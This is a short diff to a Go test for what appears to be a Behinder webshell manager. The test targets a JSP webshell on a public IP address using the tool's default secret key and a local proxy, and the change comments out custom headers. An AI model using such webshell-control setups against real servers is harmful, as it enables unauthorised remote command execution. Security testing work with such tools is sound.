@@ -15,13 +15,13 @@ import (
 func TestNewWebJSPShell(t *testing.T) {
 
 	url := "http://47.120.44.219:8080/go0p-json.jsp"
-	testHeaders := map[string]string{
-		"xxx":  "yyy",
-		"go0p": "go0p",
-	}
+	//testHeaders := map[string]string{
+	//	"xxx":  "yyy",
+	//	"go0p": "go0p",
+	//}
 	bx, _ := NewBehinderManager(url,
 		SetSecretKey("rebeyond"),
-		SetHeaders(testHeaders),
+		//SetHeaders(testHeaders),
 		SetShellScript("jsp"),
 		SetProxy("http://127.0.0.1:9999"),
 	)
